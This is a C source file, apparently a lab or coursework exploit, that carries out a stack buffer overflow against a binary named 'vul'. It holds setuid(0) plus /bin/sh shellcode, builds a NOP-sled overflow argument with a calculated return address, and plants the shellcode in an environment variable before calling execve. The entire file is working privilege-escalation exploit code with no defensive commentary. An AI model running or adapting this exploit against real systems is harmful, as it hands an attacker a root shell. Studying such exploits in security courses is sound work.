// gcc -o attack ../attack.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = 
"\x31\xdb"  //xor    %ebx,%ebx  //  begin of setuid(0)
"\x31\xc0"  //xor    %eax,%eax
"\xb0\xd5"  //mov    $0xd5,%al
"\xcd\x80"  //int    $0x80      //  end of setuid(0)
"\x31\xc0"    // xorl %eax,%eax //  begin of shellcode for /bin/sh
"\x50"        // pushl %eax
"\x68""//sh"  // pushl $0x68732f2f
"\x68""/bin"  // pushl $0x6e69622f
"\x89\xe3"    // movl %esp,%ebx
"\x50"        // pushl %eax
"\x53"      // pushl %ebx
"\x89\xe1"  // movl %esp,%ecx
"\x99"      // cdq
"\xb0\x0b"  // movb $0x0b,%al
"\xcd\x80"; // int $0x80         // end of shellcode for /bin/sh

#ifndef OFFSET
#define OFFSET 37   // you should modify this value.
#endif

#ifndef LEN
#define LEN OFFSET + 0x20
#endif

#ifndef ENVP_LEN
#define ENVP_LEN 1024 // 1024*128
#endif

void attack()
{
    printf("LEN = %d\n", LEN);
    
    char *filename = "vul";  // you should modify this line.

    printf("length of filename = %d\n", strlen(filename));
    printf("length of shellcode = %d\n", strlen(shellcode));

    char user_input[LEN];
    memset(user_input, 0x90, LEN);  // filled with NOP.
    user_input[LEN-1] = 0x00;   // end of a string.
    
    unsigned int *ps;
    ps = (unsigned int *)(user_input + OFFSET);
    *(ps) = 0xbffffffc - (strlen(filename)+1) - (strlen(shellcode)+1);
    // *(ps) = 0xbffffffc - (strlen(filename)+1) - (strlen(shellcode)+1) - ENVP_LEN/2;
    printf("RETURN_ADDR = 0x%x\n", *(ps));    

    // strcpy(user_input, "Your name.");
    
    char * name[3];
    name[0] = filename; 
    name[1] = user_input; 
    name[2] = NULL;
    
    char * envp[2];
    char attackStr[ENVP_LEN];
    strcpy(attackStr, "SHELLCODE=");
    memset(attackStr + strlen("SHELLCODE="), 0x90, ENVP_LEN - strlen("SHELLCODE="));
    int len = ENVP_LEN - strlen(shellcode)-1;
    strcpy(attackStr + len, shellcode);
    
    envp[0] = attackStr;
    envp[1] = NULL;
    execve( name[0], name, envp );
}

int main(int argc, char * argv[])
{
    attack();
    return 0;
}

